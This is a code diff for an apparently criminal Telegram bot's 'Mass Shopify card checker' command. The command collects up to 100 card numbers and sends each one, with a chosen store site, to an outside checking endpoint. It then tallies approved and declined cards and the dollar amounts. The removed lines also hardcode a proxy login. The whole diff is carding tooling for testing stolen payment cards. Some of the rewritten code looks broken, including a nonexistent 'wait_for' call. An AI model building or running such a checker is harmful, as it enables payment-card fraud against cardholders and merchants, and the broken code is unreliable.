@@ -3431,136 +3431,62 @@ async def msite_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     asyncio.create_task(run_msite_check(sites, msg))
 
 
-import asyncio
 import aiohttp
+import asyncio
 import json
 from html import escape
 from telegram import Update
 from telegram.constants import ParseMode
-from telegram.ext import ContextTypes, ConversationHandler, MessageHandler, filters, CommandHandler
+from telegram.ext import ContextTypes
 from db import get_user
 
-WAITING_CARDS = 1
-
 async def msp(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Handle /msp command, either with arguments or ask for cards"""
+    """Mass Shopify card checker"""
     user_id = update.effective_user.id
     user_data = await get_user(user_id)
-    sites = user_data.get("custom_url")
+    sites = user_data.get("custom_urls", [])  # List of sites user has added
+
     if not sites:
-        await update.message.reply_text("❌ No site set. Use /seturl first.")
+        await update.message.reply_text("❌ You have not added any sites. Use /seturl first.")
         return
 
-    # Convert single string to list if needed
-    if isinstance(sites, str):
-        sites = [sites]
-
-    # Check if user sent cards directly
-    if context.args:
-        # Cards provided in command
-        cards_text = " ".join(context.args)
-        cards = [c.strip() for c in cards_text.splitlines() if c.strip()][:100]
-
-        processing_msg = await update.message.reply_text(
-            "⏳ 𝓜𝓪𝓼𝓼 𝓢𝓱𝓸𝓹𝓲𝓯𝔂 𝓒𝓱𝓮𝓬𝓴𝓮𝓻\nProcessing cards..."
-        )
-        asyncio.create_task(check_msp_cards(cards, sites, processing_msg))
-        return
-
-    # Otherwise, ask user to send cards
-    await update.message.reply_text(
-        "⏳ 𝓟𝓵𝓮𝓪𝓼𝓮 send your cards (max 100) as text or .txt file."
+    # Ask user to send cards
+    prompt_msg = await update.message.reply_text(
+        "⏳ 𝓟𝓵𝓮𝓪𝓼𝓮 send your cards (max 100) as text or .txt file.",
+        parse_mode=ParseMode.HTML
     )
-    return WAITING_CARDS
 
-async def process_msp_cards(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Step 2: receive cards and start checking"""
-    user_id = update.effective_user.id
-    user_data = await get_user(user_id)
-    sites = user_data.get("custom_url")
-    if isinstance(sites, str):
-        sites = [sites]
+    # Wait for user to send cards (text only)
+    def check_cards(m):
+        return m.from_user.id == user_id and (m.text or m.document)
+
+    try:
+        cards_msg = await context.application.bot.wait_for("message", timeout=120, check=check_cards)
+    except asyncio.TimeoutError:
+        await prompt_msg.edit_text("❌ Timeout: You did not send cards in time.")
+        return
 
     # Extract cards
     cards = []
-    if update.message.text:
-        cards = update.message.text.splitlines()
-    elif update.message.document:
-        file = await update.message.document.get_file()
+    if cards_msg.text:
+        cards = [c.strip() for c in cards_msg.text.splitlines() if c.strip()]
+    elif cards_msg.document:
+        file = await cards_msg.document.get_file()
         content = await file.download_as_bytearray()
-        cards = content.decode().splitlines()
+        cards = [c.strip() for c in content.decode().splitlines() if c.strip()]
 
-    cards = [c.strip() for c in cards if c.strip()][:100]
-    if not cards:
-        await update.message.reply_text("❌ No valid cards found.")
-        return ConversationHandler.END
+    total_cards = len(cards)
+    if total_cards == 0:
+        await update.message.reply_text("❌ No cards found in your message/file.")
+        return
 
-    processing_msg = await update.message.reply_text(
-        "⏳ 𝓜𝓪𝓼𝓼 𝓢𝓱𝓸𝓹𝓲𝓯𝔂 𝓒𝓱𝓮𝓬𝓴𝓮𝓻\nProcessing cards..."
-    )
-
-    asyncio.create_task(check_msp_cards(cards, sites, processing_msg))
-    return ConversationHandler.END
-
-async def check_msp_cards(cards, sites, processing_msg):
-    """Background task: check all cards"""
-    stats = {"total": len(cards), "working": 0, "dead": 0, "error": 0, "checked": 0, "amt": 0.0}
+    # Initialize stats
+    stats = {"total": total_cards, "working": 0, "dead": 0, "error": 0, "checked": 0, "amt": 0.0}
     card_results = []
 
-    async with aiohttp.ClientSession() as session:
-        for card in cards:
-            for site in sites:
-                api_url = (
-                    f"https://auto-shopify-6cz4.onrender.com/index.php"
-                    f"?site={site}&cc={card}&proxy=107.172.163.27:6543:nslqdeey:jhmrvnto65s1"
-                )
-                try:
-                    async with session.get(api_url, timeout=50) as resp:
-                        data = await resp.json()
-                except:
-                    data = {"Response": "PROCESSING_ERROR", "Status": "false", "Price": "0.0"}
-
-                resp_text = data.get("Response", "")
-                price = float(data.get("Price", 0.0))
-
-                if "3D_AUTHENTICATION" in resp_text:
-                    status_symbol = "✅"
-                    stats["working"] += 1
-                    stats["amt"] += price
-                elif "CARD_DECLINED" in resp_text:
-                    status_symbol = "❌"
-                    stats["dead"] += 1
-                else:
-                    status_symbol = "⚠️"
-                    stats["error"] += 1
-
-                stats["checked"] += 1
-                card_results.append(f"{status_symbol} <code>{escape(card)}</code> ➜ {escape(resp_text)}")
-
-                # Update message live
-                output_text = (
-                    "📊 𝑴𝒂𝒔𝒔 𝑺𝒉𝒐𝒑𝒊𝒇𝔂 𝑪𝒉𝒆𝒄𝒌𝒆𝒓\n"
-                    "━━━━━━━━━━━━━━━━━━━━━━━\n"
-                    f"🌍 Total cards: {stats['total']}\n"
-                    f"✅ Approved: {stats['working']}\n"
-                    f"❌ Declined: {stats['dead']}\n"
-                    f"⚠️ Error: {stats['error']}\n"
-                    f"🔄 Checked: {stats['checked']} / {stats['total']}\n"
-                    f"💲 Amount: ${stats['amt']:.2f}\n"
-                    "━━━━━━━━━━━━━━━━━━━━━━━\n"
-                    "📝 Card Results\n"
-                    "────────────────\n"
-                    + "\n".join(card_results[-5:])  # show last 5 cards for live update
-                    + "\n────────────────"
-                )
-                try:
-                    await processing_msg.edit_text(output_text, parse_mode=ParseMode.HTML, disable_web_page_preview=True)
-                except:
-                    pass  # message too long, skip
-
-    # Final update with all cards
-    final_text = (
-        "📊 𝑴𝒂𝒔𝒔 𝑺𝒉𝒐𝒑𝒊𝒇𝔂 𝑪𝒉𝒆𝒄𝒌𝒆𝒓\n"
+    # Send initial processing message
+    status_msg = await update.message.reply_text(
+        f"📊 𝑴𝒂𝒔𝒔 𝑺𝒉𝒐𝒑𝒊𝒇𝔂 𝑪𝒉𝒆𝒄𝒌𝒆𝒓\n"
         "━━━━━━━━━━━━━━━━━━━━━━━\n"
         f"🌍 Total cards: {stats['total']}\n"
         f"✅ Approved: {stats['working']}\n"
@@ -3568,22 +3494,94 @@ async def check_msp_cards(cards, sites, processing_msg):
         f"⚠️ Error: {stats['error']}\n"
         f"🔄 Checked: {stats['checked']} / {stats['total']}\n"
         f"💲 Amount: ${stats['amt']:.2f}\n"
-        "━━━━━━━━━━━━━━━━━━━━━━━\n"
+        "━━━━━━━━━━━━━━━━━━━━━━━\n\n"
         "📝 Card Results\n"
-        "────────────────\n"
-        + "\n".join(card_results)
-        + "\n────────────────"
+        "━━━━━━━━━━━━━━━━━━━━━━━",
+        parse_mode=ParseMode.HTML
     )
-    await processing_msg.edit_text(final_text, parse_mode=ParseMode.HTML, disable_web_page_preview=True)
 
-# Register ConversationHandler
-msp_handler = ConversationHandler(
-    entry_points=[CommandHandler("msp", msp)],
-    states={
-        WAITING_CARDS: [MessageHandler(filters.TEXT | filters.Document.ALL, process_msp_cards)]
-    },
-    fallbacks=[],
-)
+    async with aiohttp.ClientSession() as session:
+        for card in cards:
+            for site in sites:
+                api_url = f"https://auto-shopify-6cz4.onrender.com/index.php?site={site}&cc={card}"
+                try:
+                    async with session.get(api_url, timeout=50) as resp:
+                        raw_text = await resp.text()
+                        data = json.loads(raw_text)
+
+                    response_text = data.get("Response", "").upper()
+                    price = float(data.get("Price", 0.0))
+
+                    # Determine status
+                    if "3D_AUTHENTICATION" in response_text:
+                        status_emoji = "✅"
+                        stats["working"] += 1
+                        stats["amt"] += price
+                    elif "CARD_DECLINED" in response_text:
+                        status_emoji = "❌"
+                        stats["dead"] += 1
+                    else:
+                        status_emoji = "⚠️"
+                        stats["error"] += 1
+
+                    stats["checked"] += 1
+                    card_results.append(f"{status_emoji} <code>{escape(card)}</code>\n   ↳ {escape(response_text)}")
+
+                    # Edit the status message live
+                    formatted_results = "\n".join(card_results[-10:])  # show last 10 cards for brevity
+                    await status_msg.edit_text(
+                        f"📊 𝑴𝒂𝒔𝒔 𝑺𝒉𝒐𝒑𝒊𝒇𝔂 𝑪𝒉𝒆𝒄𝒌𝒆𝒓\n"
+                        "━━━━━━━━━━━━━━━━━━━━━━━\n"
+                        f"🌍 Total cards: {stats['total']}\n"
+                        f"✅ Approved: {stats['working']}\n"
+                        f"❌ Declined: {stats['dead']}\n"
+                        f"⚠️ Error: {stats['error']}\n"
+                        f"🔄 Checked: {stats['checked']} / {stats['total']}\n"
+                        f"💲 Amount: ${stats['amt']:.2f}\n"
+                        "━━━━━━━━━━━━━━━━━━━━━━━\n\n"
+                        "📝 Card Results\n"
+                        "━━━━━━━━━━━━━━━━━━━━━━━\n"
+                        f"{formatted_results}",
+                        parse_mode=ParseMode.HTML
+                    )
+                    await asyncio.sleep(0.5)  # small delay to avoid flooding
+                except Exception as e:
+                    stats["error"] += 1
+                    stats["checked"] += 1
+                    card_results.append(f"⚠️ <code>{escape(card)}</code>\n   ↳ API Error")
+                    await status_msg.edit_text(
+                        f"📊 𝑴𝒂𝒔𝒔 𝑺𝒉𝒐𝒑𝒊𝒇𝔂 𝑪𝒉𝒆𝒄𝒌𝒆𝒓\n"
+                        "━━━━━━━━━━━━━━━━━━━━━━━\n"
+                        f"🌍 Total cards: {stats['total']}\n"
+                        f"✅ Approved: {stats['working']}\n"
+                        f"❌ Declined: {stats['dead']}\n"
+                        f"⚠️ Error: {stats['error']}\n"
+                        f"🔄 Checked: {stats['checked']} / {stats['total']}\n"
+                        f"💲 Amount: ${stats['amt']:.2f}\n"
+                        "━━━━━━━━━━━━━━━━━━━━━━━\n\n"
+                        "📝 Card Results\n"
+                        "━━━━━━━━━━━━━━━━━━━━━━━\n"
+                        f"{card_results[-10:]}",
+                        parse_mode=ParseMode.HTML
+                    )
+
+    # Final full update
+    await status_msg.edit_text(
+        f"📊 𝑴𝒂𝒔𝒔 𝑺𝒉𝒐𝒑𝒊𝒇𝔂 𝑪𝒉𝒆𝒄𝒌𝒆𝒓\n"
+        "━━━━━━━━━━━━━━━━━━━━━━━\n"
+        f"🌍 Total cards: {stats['total']}\n"
+        f"✅ Approved: {stats['working']}\n"
+        f"❌ Declined: {stats['dead']}\n"
+        f"⚠️ Error: {stats['error']}\n"
+        f"🔄 Checked: {stats['checked']} / {stats['total']}\n"
+        f"💲 Amount: ${stats['amt']:.2f}\n"
+        "━━━━━━━━━━━━━━━━━━━━━━━\n\n"
+        "📝 Card Results\n"
+        "━━━━━━━━━━━━━━━━━━━━━━━\n"
+        + "\n".join(card_results),
+        parse_mode=ParseMode.HTML
+    )
+
 
 
 
